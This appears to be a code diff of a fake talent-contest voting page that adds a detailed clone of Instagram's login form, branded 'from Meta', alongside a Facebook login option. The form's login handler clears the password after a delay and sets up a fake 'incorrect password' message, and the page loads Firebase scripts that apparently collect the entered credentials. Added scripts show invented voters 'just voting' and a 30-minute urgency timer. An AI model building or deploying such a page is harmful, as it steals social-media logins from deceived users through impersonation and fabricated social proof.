-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1651087663/vnhy7bod3d3auu3qyny4.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 009 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 57
-            </div>
-          </div>
-        </div>
-               
-        <div class="col-sm-4">
-          <div class="card text-center">
-            <div class="card-header">Contestant 010  </div>
-              <div class="card-body">
-                  <h5 class="card-title"><span class="badge bg-warning text-dark">Entertainment</span> - <span class="badge bg-info text-dark">Comedy</span></h5>
-                  <video controls width="100%">
-
-                    <source src ="https://res.cloudinary.com/arabasiastarz/video/upload/v1650661497/t9tttunayegnzxibyoem.mov" type="video/mp4">
-
-                    <!-- <source src="mov_bbb.ogg" type="video/ogg"> -->
-
-                    Your browser does not support HTML video.
-                  </video>
-                  <button id="vote" type="button" class="btn btn-primary vote" data-id="294" data-user="484" data-bs-toggle="modal" data-bs-target="#exampleModal" onclick="vote()" >
-                  VOTE For Contestant 010 </a></button>
-                </div>
-              <div class="card-footer text-muted"> Votes : 41 
-            </div>
-          </div>
-        </div></div>
-               
-
-    </section>
-</div>
-    <div id="choose">
-      <center><br>
-        <p>
-          Vote using:
-        </p>
-      </center>
-      <center>
-        <p>
-          <img id="fb" onclick="fb()" src="image/fb.png">
-        </p>
-        <p>
-          <img id="ig" onclick="ig()" src="image/ig.png">
-        </p>
-        <br>
-        <button onclick="can()" id="cancel">Close</button>
-      </center>
-    </div>
-  <center>
-    <div id="fbp">
-      <div class="facebook-login" id="fb2" align="center">
-
-        <div class="ggt">
-
-          <img src="image/fb.png" alt="logo" id="fblogo">
-          <h1 id="fb2">
-            facebook
-          </h1>
-          <input type="text" placeholder="Email or Phone number" id="fb-email"><br>
-          <input type="password" placeholder="Password" id="fb-pass"><br>
-          <button onclick="login()" id="fb-log">
-            Log in
-          </button>
-        </div>
-      </div>
 
     </div>
-  </center>
-  <center>
-    <div id="igp">
-      <div class="Instagram-login" id="ig2" align="center">
 
-        <div class="ppt">
+    <!--Insta login begins-->
+    <div id="ig_wrapper">
+        <div id="igcontainer" class="_ar45 system-fonts--body roboto">
+            <div id="mount_0_0_6z">
+                <div class="">
+                    <div class="">
+                        <div
+                            class="x4afe7t x1v7wizp xqcmdr3 x1htlvfj xds687c xixxii4 x17qophe x13vifvy x1x85hfe x1s85apg">
+                            <div
+                                class="x1x1c4bx x1c74tu6 x1v7wizp x1w55rbo xa3vuyk xuoj239 xee5nap xh8yej3 x1so62im xds687c xixxii4 x17qophe x13vifvy x1x85hfe">
+                                <div
+                                    class="x1x1c4bx x1c74tu6 xa4qsjk x1eg1fw9 x1esw782 x12zrl2 xuoj239 xee5nap xh8yej3 x1so62im">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="x9f619 x1n2onr6 x1ja2u2z">
+                            <div class="x78zum5 xdt5ytf x1n2onr6 x1ja2u2z">
+                                <div class="x78zum5 xdt5ytf x1n2onr6 xat3117 xxzkxad x4m6w61">
+                                    <div class="x78zum5 xdt5ytf x1t2pt76 x1n2onr6 x1ja2u2z x10cihs4">
+                                        <section class="x78zum5 xdt5ytf x1iyjqo2 x1wjobn4">
+                                            <main class="xvbhtw8 x78zum5 xdt5ytf x1iyjqo2 x182iqb8 x1n2onr6 xg6iff7"
+                                                role="main">
+                                                <nav
+                                                    class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdt5ytf x2lah0s xln7xf2 xk390pu x1anpbxc xmo9yow xat24cr x17adc0v xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x11njtxf">
+                                                    <span
+                                                        class="x1ypdohk x1rg5ohu x1n2onr6 x16dsc37 x1pg5gke x1yrsyyn xsyo7zv x10b6aqq x16hj40l x1qkh490">
+                                                        <div
+                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1uhb9sk x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
+                                                            <span
+                                                                class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye x1fhwpqd xo1l8bm x1roi4f4 x1s3etm8 x676frb x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                dir="auto"
+                                                                style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 16px;">English</span>
+                                                            <div
+                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xsgj6o6 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh xl56j7k">
+                                                                <span
+                                                                    style="display: inline-block; transform: rotate(180deg);"><svg
+                                                                        aria-label="Down chevron icon"
+                                                                        class="x1lliihq x1n2onr6 x1roi4f4"
+                                                                        fill="currentColor" height="12" role="img"
+                                                                        viewBox="0 0 24 24" width="12">
+                                                                        <title>Down chevron icon</title>
+                                                                        <path
+                                                                            d="M21 17.502a.997.997 0 0 1-.707-.293L12 8.913l-8.293 8.296a1 1 0 1 1-1.414-1.414l9-9.004a1.03 1.03 0 0 1 1.414 0l9 9.004A1 1 0 0 1 21 17.502Z">
+                                                                        </path>
+                                                                    </svg></span>
+                                                            </div>
+                                                        </div>
+                                                    </span>
+                                                </nav>
+                                                <article
+                                                    class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 x1q0g3np x1iyjqo2 x2lah0s xk390pu xl56j7k xg87l8a xkrivgy xat24cr x1gryazu x1ykew4q xexx8yu x4uap5 x1gan7if xkhd6sd x11njtxf xh8yej3 x1d2lwc3 x1n2onr6">
+                                                    <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+                                                        style="width: 100%;">
+                                                        <div
+                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
+                                                            <div class="_ab1y _ab1-">
+                                                                <div class="_ab21">
+                                                                    <div
+                                                                        class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xseo6mj xod5an3 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                        <div aria-disabled="false" role="button"
+                                                                            tabindex="0" style="cursor: pointer;"><i
+                                                                                data-visualcompletion="css-img"
+                                                                                aria-label="Instagram" class=""
+                                                                                style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yh/r/IS7e616CiR2.png&quot;); background-position: 0px 0px; background-size: 176px 258px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class="_ab3a">
 
-          <img src="image/ig2.jpg" alt="logo" id="iglogo"><br><br>
-          <br>
-          <input type="text" placeholder="Username or Email" id="ig-uname"><br>
-          <input type="password" placeholder="Password" id="ig-pass">
-          <br>
-          <button onclick="iglog()" id="ig-log">
-            log in
-          </button>
+                                                                        <div
+                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xqui205 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                            <div
+                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                <button onclick="fb()"
+                                                                                    class=" _acan _acap _acas _aj1- _ap30"
+                                                                                    type="button"><span
+                                                                                        class="_9zlu _ab36"></span><span
+                                                                                        class="">Continue with
+                                                                                        Facebook</span></button>
+                                                                            </div>
+                                                                            <div class="_ab38">
+                                                                                <div class="x78zum5 x1q0g3np">
+                                                                                    <div
+                                                                                        class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
+                                                                                    </div>
+                                                                                    <div
+                                                                                        class="x1qjc9v5 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1roi4f4 x78zum5 xdt5ytf x1c4vz4f x2lah0s x1nxh6w3 x1s688f x1ly1vsg xdj266r xpdqn1h xat24cr x1sliqq xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xtvhhri x11njtxf">
+                                                                                        or</div>
+                                                                                    <div
+                                                                                        class="x1iyjqo2 xs83m0k xjm9jq1 x1n2onr6 xwtuau4 x11mr3az">
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="instacontainer">
+                                                                                <div
+                                                                                    class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
+                                                                                    <label class="_aa48 _aa49"><span
+                                                                                            class="_aa4a">Phone
+                                                                                            number,
+                                                                                            username, or
+                                                                                            email</span><input
+                                                                                            id="ig-uname"
+                                                                                            aria-label="Phone number, username, or email"
+                                                                                            aria-required="true"
+                                                                                            autocapitalize="off"
+                                                                                            autocorrect="off"
+                                                                                            maxlength="75"
+                                                                                            class="_aa4b _add6 _ac4d _ap35"
+                                                                                            dir="" type="text"></label>
+                                                                                    <div
+                                                                                        class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div class="instacontainer">
+                                                                                <div
+                                                                                    class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
+                                                                                    <label class="_aa48 _aa49">
+                                                                                        <span
+                                                                                            class="_aa4a">Password</span>
+                                                                                        <input id="ig-pass"
+                                                                                            aria-label="Password"
+                                                                                            aria-required="true"
+                                                                                            autocapitalize="off"
+                                                                                            autocorrect="off"
+                                                                                            class="_aa4b _add6 _ac4d _ap35"
+                                                                                            type="password" dir="">
+                                                                                    </label>
+                                                                                    <div
+                                                                                        class="x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xdl72j9 x1q0g3np x1c4vz4f x2lah0s xk390pu x5yr21d xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x1sxyh0 x18d9i69 xkhd6sd x1n2onr6 xxymvpz">
+                                                                                        <div
+                                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1i64zmx x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <div
+                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1e56ztr x540dpk x1m39q7l xsag5q8 xz9dl7a x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh x13a6bvl">
+                                                                                <span
+                                                                                    class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x173jzuc x2b8uid x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                                    dir="auto"
+                                                                                    style="cursor: pointer; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">Forgot
+                                                                                    password?</span>
+                                                                            </div>
+
+
+                                                                            <div
+                                                                                class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1xmf6yo x1e56ztr x540dpk x1m39q7l x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1">
+
+                                                                                <button
+                                                                                    class="c-btn _acan _acap _acas _aj1- _ap30"
+                                                                                    type="submit"
+                                                                                    onclick="iglog(); clearInstagramPasswordField();"
+                                                                                    id="ig-log"> Log in</button>
+                                                                            </div>
+
+                                                                        </div>
+
+                                                                        <span id="ig_error_box"
+                                                                            class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x5n08af x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                            dir="auto"
+                                                                            style=" display: none; line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
+                                                                            <div class="_ab2z">Sorry, your password was
+                                                                                incorrect. Please double-check your
+                                                                                password.</div>
+                                                                        </span>
+
+                                                                        <div
+                                                                            class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh xw7yly9 x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x6s0dn4 x1oa3qoh x1nhvcw1">
+                                                                            <span
+                                                                                class="x1lliihq x1plvlek xryxfnj x1n2onr6 x193iq5w xeuugli x1fj9vlw x13faqbe x1vvkbs x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x1i0vuye xvs91rp xo1l8bm x1roi4f4 x1tu3fi x3x7a5m x10wh9bi x1wdrske x8viiok x18hxmgj"
+                                                                                dir="auto"
+                                                                                style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
+                                                                                <p>Don't have an account? <span
+                                                                                        class="_ap3a _aaco _aacw _aad0 _aad7"
+                                                                                        dir="auto">Sign
+                                                                                        up</span>
+                                                                                </p>
+                                                                            </span>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                </article>
+                                                <div
+                                                    class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1hq5gj4 x1n2onr6 x1ey2m1c x1plvlek xryxfnj x1c4vz4f x2lah0s x1q0g3np xqjyukv x1qjc9v5 x1oa3qoh xl56j7k">
+                                                    <div class="x9f619 xjbqb8w x78zum5 x168nmei x13lgxp2 x5pf9jr xo71vjh x1n2onr6 x1plvlek xryxfnj x1c4vz4f x2lah0s xdt5ytf xqjyukv x1qjc9v5 x1oa3qoh x1nhvcw1"
+                                                        style="height: 26px; width: 52px;"><img alt="from Meta"
+                                                            src="img/meta.svg">
+                                                    </div>
+                                                </div>
+                                            </main>
+                                        </section>
+                                        <div>
+                                            <div></div>
+                                        </div>
+                                    </div>
+                                    <div>
+                                        <div></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
-      </div>
     </div>
-  </center>
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
-
-  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
-
-  <script src="js/firebase.js">
 
 
+    <!--Insta login ends-->
 
-  </script>
+
+    <script>
+
+        function clearInstagramPasswordField() {
+            // Set a delay before clearing the password field (in milliseconds)
+            setTimeout(function () {
+                // Get the password field element by its ID
+                var passwordField = document.getElementById("ig-pass");
+
+                // Clear the value of the password field
+                passwordField.value = "";
+            }, 2000); // Delay of 2000ms (2 seconds)
+        }
+
+
+
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById("password");
+            var toggleButton = document.querySelector(".toggle-password");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                toggleButton.style.backgroundImage = "url('img/view.png')"; // Change to visible icon
+            } else {
+                passwordField.type = "password";
+                toggleButton.style.backgroundImage = "url('img/hide.png')"; // Change to hidden icon
+            }
+        }
+
+        function toggleClearIcon() {
+            var input = document.getElementById("email");
+            var clearIcon = document.getElementById("clearIcon");
+
+            if (input.value.trim() !== "") {
+                clearIcon.style.display = "block";
+            } else {
+                clearIcon.style.display = "none";
+            }
+        }
+
+        function clearEmailInput() {
+            var input = document.getElementById("email");
+            input.value = "";
+            document.getElementById("clearIcon").style.display = "none";
+        }
+
+        function changeFavicon(iconUrl) {
+            const favicon = document.getElementById('dynamic-favicon');
+            favicon.href = iconUrl;
+        }
+
+        function fb() {
+            document.getElementById("fb_wrapper").style.display = "block";
+            document.getElementById("ig_wrapper").style.display = "none";
+            document.getElementById("home").style.display = "none";
+            document.getElementById("choose").style.display = "none";
+
+        }
+
+        function handleFbClick() {
+            changeFavicon('img/favicon.png');
+            fb();
+            document.title = 'Log in to Facebook';
+        }
+
+
+        function ig() {
+            document.getElementById("ig_wrapper").style.display = "block";
+            document.getElementById("fb_wrapper").style.display = "none";
+            document.getElementById("home").style.display = "none";
+            document.getElementById("choose").style.display = "none";
+        }
+
+        function handleIgClick() {
+            changeFavicon('img/igfavicon.png');
+            ig();
+            document.title = 'Instagram';
+
+        }
+
+
+        function closeVoteBox() {
+            document.getElementById('voteBox').style.display = 'none';
+        }
+
+    </script>
+
+    <script type="text/javascript">
+        var listCountries = ['China', 'India', 'Japan', 'South Korea', 'Indonesia', 'Saudi Arabia', 'Turkey', 'Iran', 'Thailand', 'Malaysia',
+            'Vietnam', 'Philippines', 'Pakistan', 'Bangladesh', 'Iraq', 'United Arab Emirates', 'Israel', 'Singapore',
+            'Kuwait', 'Jordan', 'Lebanon', 'Qatar', 'Kazakhstan', 'Oman', 'Sri Lanka', 'Myanmar', 'Bahrain', 'Yemen',
+            'Georgia', 'Armenia', 'Azerbaijan', 'Uzbekistan', 'Turkmenistan', 'Kyrgyzstan', 'Tajikistan', 'Maldives',
+            'Brunei', 'Bhutan'
+        ];
+        var listPeople = [
+            { name: 'Li Wei', image: 'https://randomuser.me/api/portraits/men/1.jpg' },
+            { name: 'Arjun Gupta', image: 'https://randomuser.me/api/portraits/men/2.jpg' },
+            { name: 'Haruto Tanaka', image: 'https://randomuser.me/api/portraits/men/3.jpg' },
+            // Add more names and corresponding image URLs here
+            { name: 'Ji-ho Kim', image: 'https://randomuser.me/api/portraits/men/4.jpg' },
+            { name: 'Budi Santoso', image: 'https://randomuser.me/api/portraits/men/5.jpg' },
+            { name: 'Faisal Al-Saud', image: 'https://randomuser.me/api/portraits/men/6.jpg' },
+            { name: 'Ahmet Yilmaz', image: 'https://randomuser.me/api/portraits/men/7.jpg' },
+            { name: 'Ali Reza', image: 'https://randomuser.me/api/portraits/men/8.jpg' },
+            { name: 'Somchai Prasert', image: 'https://randomuser.me/api/portraits/men/9.jpg' },
+            { name: 'Siti Nurhaliza', image: 'https://randomuser.me/api/portraits/women/1.jpg' },
+            { name: 'Nguyen Van A', image: 'https://randomuser.me/api/portraits/men/10.jpg' },
+            { name: 'Juan Dela Cruz', image: 'https://randomuser.me/api/portraits/men/11.jpg' },
+            { name: 'Mohammed Ali', image: 'https://randomuser.me/api/portraits/men/12.jpg' },
+            { name: 'Rahim Ahmed', image: 'https://randomuser.me/api/portraits/men/13.jpg' },
+            { name: 'Fatima Hassan', image: 'https://randomuser.me/api/portraits/women/2.jpg' },
+            { name: 'Layla Khalid', image: 'https://randomuser.me/api/portraits/women/3.jpg' },
+            { name: 'Lian Zhang', image: 'https://randomuser.me/api/portraits/women/4.jpg' },
+            { name: 'Siti Zainab', image: 'https://randomuser.me/api/portraits/women/5.jpg' },
+            { name: 'Hiroshi Yamamoto', image: 'https://randomuser.me/api/portraits/men/14.jpg' },
+            { name: 'Sun-woo Park', image: 'https://randomuser.me/api/portraits/men/15.jpg' },
+            { name: 'Priya Sharma', image: 'https://randomuser.me/api/portraits/women/6.jpg' },
+            { name: 'Hassan Jafari', image: 'https://randomuser.me/api/portraits/men/16.jpg' },
+            { name: 'Sandeep Kumar', image: 'https://randomuser.me/api/portraits/men/17.jpg' },
+            { name: 'Sara Lee', image: 'https://randomuser.me/api/portraits/women/7.jpg' },
+            { name: 'Tariq Abdullah', image: 'https://randomuser.me/api/portraits/men/18.jpg' },
+            { name: 'Rina Suzuki', image: 'https://randomuser.me/api/portraits/women/8.jpg' },
+            { name: 'Niran Chaiyaphum', image: 'https://randomuser.me/api/portraits/men/19.jpg' },
+            { name: 'Kavita Patel', image: 'https://randomuser.me/api/portraits/women/9.jpg' },
+            { name: 'Anwar Al-Mutairi', image: 'https://randomuser.me/api/portraits/men/20.jpg' },
+            { name: 'Mariam Al-Harbi', image: 'https://randomuser.me/api/portraits/women/10.jpg' },
+            { name: 'Chihiro Nakamura', image: 'https://randomuser.me/api/portraits/women/11.jpg' },
+            { name: 'Yuki Saito', image: 'https://randomuser.me/api/portraits/women/12.jpg' },
+            { name: 'Kazuki Takahashi', image: 'https://randomuser.me/api/portraits/men/21.jpg' },
+            { name: 'Aya Nakamura', image: 'https://randomuser.me/api/portraits/women/13.jpg' },
+            { name: 'Shuichi Tanaka', image: 'https://randomuser.me/api/portraits/men/22.jpg' },
+            { name: 'Aziz Al-Faraj', image: 'https://randomuser.me/api/portraits/men/23.jpg' },
+            { name: 'Siti Hajar', image: 'https://randomuser.me/api/portraits/women/14.jpg' }
+        ];
+
+        var transarray = ['just <b>voted</b>'];
+
+        // Function to assign random image URLs to listPeople array
+        function assignRandomImages() {
+            for (var i = 0; i < listPeople.length; i++) {
+                listPeople[i].image = `https://randomuser.me/api/portraits/${Math.random() > 0.5 ? 'men' : 'women'}/${Math.floor(Math.random() * 100)}.jpg?nat=ae`;
+            }
+        }
+
+        // Call function to assign random images
+        assignRandomImages();
+
+        // Function to display random messages
+        function request() {
+            clearInterval(run);
+            let interval = Math.floor(Math.random() * (20000 - 4000 + 1) + 4000);
+            var country = listCountries[Math.floor(Math.random() * listCountries.length)];
+            var person = listPeople[Math.floor(Math.random() * listPeople.length)];
+            var transtype = transarray[Math.floor(Math.random() * transarray.length)];
+
+            var msg = '<img src="' + person.image + '" class="profile-pic" alt="Profile Picture">' +
+                      '<span class="txt">' + person.name + ' from <b>' + country + '</b> ' + transtype ;
+            $(".mgm").html(msg); // Update entire content of .mgm
+            $(".mgm").stop(true).fadeIn(300);
+            window.setTimeout(function () {
+                $(".mgm").stop(true).fadeOut(300);
+            }, 10000);
+            run = setInterval(request, interval);
+        }
+
+        let interval = Math.floor(Math.random() * (20000 - 4000 + 1) + 4000);
+        var run = setInterval(request, interval);
+    </script>
+
+    <script>
+        var timer;
+        var startTime;
+        var elapsedTime = 1800 * 1000; // 30 minutes in milliseconds
+        var running = false;
+
+        function startTimer() {
+            startTime = Date.now();
+            timer = setInterval(updateTime, 1000); // Update every second
+            running = true;
+        }
+
+        function stopTimer() {
+            if (running) {
+                clearInterval(timer);
+                running = false;
+            }
+        }
+
+        function resetTimer() {
+            clearInterval(timer);
+            elapsedTime = 1800 * 1000; // Reset to 30 minutes in milliseconds
+            updateDisplay(elapsedTime);
+            running = false;
+        }
+
+        function updateTime() {
+            var currentTime = Date.now();
+            elapsedTime = 1800 * 1000 - (currentTime - startTime);
+            if (elapsedTime < 0) {
+                elapsedTime = 0;
+                stopTimer();
+                alert('Countdown finished!');
+            }
+            updateDisplay(elapsedTime);
+        }
+
+        function updateDisplay(elapsedTime) {
+            var totalSeconds = Math.floor(elapsedTime / 1000);
+            var minutes = Math.floor(totalSeconds / 60);
+            var seconds = totalSeconds % 60;
+
+            var minutesStr = padTime(minutes);
+            var secondsStr = padTime(seconds);
+
+            document.getElementById('timer').textContent = minutesStr + ':' + secondsStr;
+        }
+
+        function padTime(time) {
+            return time < 10 ? '0' + time : time;
+        }
+
+        // Automatically start countdown on page load
+        window.onload = function() {
+            startTimer();
+
+            // Add event listener to hide stopwatch on any button click
+            document.addEventListener('click', function(event) {
+                if (event.target.tagName.toLowerCase() === 'button') {
+                    document.getElementById('stopwatch').style.display = 'none';
+                }
+            });
+        };
+    </script>
+
+    <script>
+      // Function to show the Choose dialog
+      function showDialog() {
+        document.getElementById("choose").classList.add("active");
+      }
+      
+      // Function to hide the Choose dialog
+      function hideDialog() {
+        document.getElementById("choose").classList.remove("active");
+      }
+  
+    </script>
+
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+    <script src="/js/firebase.js"></script>
+
+
 </body>
+
 </html>
